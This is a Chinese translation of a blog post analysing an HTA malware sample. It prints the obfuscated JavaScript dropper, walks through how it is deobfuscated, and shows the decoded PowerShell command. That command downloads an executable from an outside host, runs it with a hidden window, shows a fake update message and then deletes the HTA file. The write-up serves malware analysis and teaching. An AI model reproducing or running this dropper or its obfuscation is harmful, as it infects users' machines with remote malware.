<html>
<head>
<title>hta Malware analysis</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">hta恶意软件分析</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hta-malware-analysis-96bd9263208?source=collection_archive---------2-----------------------#2022-10-16">https://infosecwriteups.com/hta-malware-analysis-96bd9263208?source=collection_archive---------2-----------------------#2022-10-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="af8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这篇文章中，我们将查看一个hta恶意软件文件，并了解一些我们可以用来理解混淆代码的解码技术。换句话说，让我们做一些好的老式静态恶意软件分析。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/99c54bad76dd458df6fbd7a0dc96d6c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ivlfFwrDbDgYx4eRXNS8Fg.png"/></div></div></figure><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="2546" class="lc ld iq ky b gy le lf l lg lh">&lt;script&gt;var wyyqbu=’tarjya d{x mmaomvveqTioh(j-c1b0e0r,j-v1t0c0r)d;przeismirzfeeTnof(o0n,j0l)a;j xav=angedwk jAecotbiovjeuXrObbxjheacgtt(s\’lWxsfcrrlitpatw.tSkhueplklb\’t)v;k yaj.lRmutnf(e”uPdolwvejreSnhveclslm n-lWmiknfdxoewvSitfyoldeq mHmicdzdfehnd a$ldp=v$ueunivq:wtbecmjpn+p\’t\s\m4yao2u9e2c4y8v0o8lfx6n6r9e8r5rdqeg3mal9bavdb1xew3ddh7j4s3bec0fdz.qeaxeet\’y;z(hNjewwv-a’;var nhm=’Obbnjsescute dSvyzsetsewmh.zNfeata.iWgeabzChleisefnetz)p.bDvoqwdniliovacdnFyixlnec(q\’j khqtptlpqsx:r/r/wayhvtoaeeaeoruebdjdkifts.toarvgg/y1t7t/b5j2d4m.zdsaxtq\’p,p$hdm)o;dSbtsadrptn-fPzrxokcrerslsm y$jdf;s[lSpyvsxtoenmu.fRdejfmlpeycptqiqotng.dAysfsbejmxbtluyk]r:e:qLjopafdeWniutshiPzavrstlilaqlbNbagmueh(k\’tSnymsctkefmx.uWwibnkdgorwqsk.fFkodrnmksz\’f’;var ohwrpi=’)v;k[vswylsctretmn.kwgiznndroewksl.afmowrgmesm.rmjexsvsxahguecbdoexy]a:q:bsrhjoowb(q\’nUpphdrazttes mcqozmqpclreataem.y\’h,g\’bIknkfzolrbmaactlipoenb\’c,t[jWuitnddmofwtsm.wFwodrxmwsp.vMeewswspahgweaBiowxcBtumthtvoonbse]i:u:hOvKa,a h[xSxylsutteamp.yWwimnndeoiwnsm.fFqogrrmysb.gMzefsosuangkevBoosxsIlcdomnf]d:c:dIanpfrofrxmeartdivoxnu)t;y”a,t0e,pfnaslzsi’;var uzite=’eg)s;avsavrn ybz=qnbeawg tAfcdtxiwvgetXuObbnjteccgtx(r\’uSqcrrciwpjtdipnfgr.nFeiilpeeSoyisjtsegmgOzbajbeacntu\’c)u;svuaori mpr f=v vduoacnuhmfevnxtj.klgotccamtaicomnb.dharwegfu;opa i=w nuznbeisvcwajpiee(ppe.bszuobhsstrru(t8t)g)v;xihfr d(bbf.eFjiclrejEdxaiesztksn(dpz)r)fby.fDmerlxehtkerFnifloeu(wpr)w;c v}g ecmapticnhu i(xeh)m w{z}r uceleolscel(w)t;z’;var vpropt=’ b’;var ujqffvih=wyyqbu+nhm+ohwrpi+uzite+vpropt; var gbakdvjuy=””; var kyhbqlqmmr=2; var a=0; while(a&lt;ujqffvih.length){ gbakdvjuy +=ujqffvih.charAt(a);a +=kyhbqlqmmr; }; bztjfyeogy=”ev”.concat(“al”); window[bztjfyeogy](gbakdvjuy); &lt;/script&gt;</span></pre><p id="b31d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来我们正在处理一些非常混乱的javascript代码。为了让代码更漂亮，便于我们分析和理解，首先让我们将它复制到一个新文件中，并保存为JS格式，以突出语法，让我们尝试对它进行一点美化。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi li"><img src="../Images/99a665338cd49e493e4b8e4b9c275284.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7YboyBcWM4JHYVCDw0_pZg.png"/></div></div><figcaption class="lj lk gj gh gi ll lm bd b be z dk translated">有点美化了</figcaption></figure><p id="50cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，这样好一点了。但仍然没有多大意义。查看代码，我们可以看到在开始时声明了五个字符串变量。后来在第13行，它们都被连接起来了。我们可以重命名这些变量，使其更加清晰。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ln"><img src="../Images/9ba8bdefd5e9e2a10f968fb3bd35e7ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yD618bIKYfM8_-bk5GALMQ.png"/></div></div></figure><p id="f9f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一节中，还有一些变量声明和一个while循环。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lo"><img src="../Images/c83a415b772d6c67c4400ce092d629b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pQHhccdbqw7jSQRLYv1lfg.png"/></div></div></figure><p id="f196" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们仔细观察一下逻辑，我们可以猜测被定义为空字符串的变量“gbakdvjuy”被用来构建一个去模糊化的有效负载。</p><p id="2ce7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">变量“kyhbqlqmnr”似乎是增量大小，在我们的例子中是二(2)。而“a”似乎是计数器，初始化为0。</p><p id="6b60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们继续重命名这些变量。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/50a6c444a457a2e536ecd7cc7f204d80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1062/format:webp/1*UF_u6KM5vwh3k7IqKXAfJg.png"/></div></figure><p id="17df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">while循环非常简单。它遍历通过组合前4个变量构建的concatenatedString，并将每隔一个字符追加到新的变量有效载荷中。</p><p id="60d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以运行代码到这一点，并打印出变量payload的最终值。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lq"><img src="../Images/dcac25f3db34a39fda125650c75422ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GkM3jf5MAx7_w7URtI4iJg.png"/></div></div></figure><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="62b9" class="lc ld iq ky b gy le lf l lg lh">try { moveTo(-100,-100);resizeTo(0,0); a=new ActiveXObject('Wscript.Shell'); a.Run("PowerShell -WindowStyle Hidden $d=$env:temp+'s4a2924808f66985de3a9ad1e3d743e0d.exe';(New-Object System.Net.WebClient).DownloadFile(' <a class="ae lr" href="https://ahtaeereddit.org/17/524.dat',$d);Start-Process" rel="noopener ugc nofollow" target="_blank">https://ahtaeereddit.org/17/524.dat',$d);Start-Process</a> $d;[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[system.windows.forms.messagebox]::show('Update complete.','Information',[Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);",0,false);var b=new ActiveXObject('Scripting.FileSystemObject');var p = document.location.href;p = unescape(p.substr(8));if (b.FileExists(p))b.DeleteFile(p); } catch (e) {} close();</span></pre><p id="6909" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于原始文件是HTML应用程序(hta)文件，mshta.exe将被用作程序代理来执行这个脚本。</p><p id="bd96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到，我们的“恶意. hta”文件在执行时会产生PowerShell可执行文件。</p><p id="9ba9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">恶意软件文件的名称为“s4a 2924808 f 66985 de 3 a9 ad 1e 3d 743 e0d . exe”。而malware.hta中恶意JavaScript试图下载. dat文件的完整网址是“<a class="ae lr" href="https://ahtaeereddit.org/17/524.dat" rel="noopener ugc nofollow" target="_blank">https://ahtaeereddit.org/17/524.dat</a></p><p id="096d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">黑客快乐！</p></div></div>    
</body>
</html>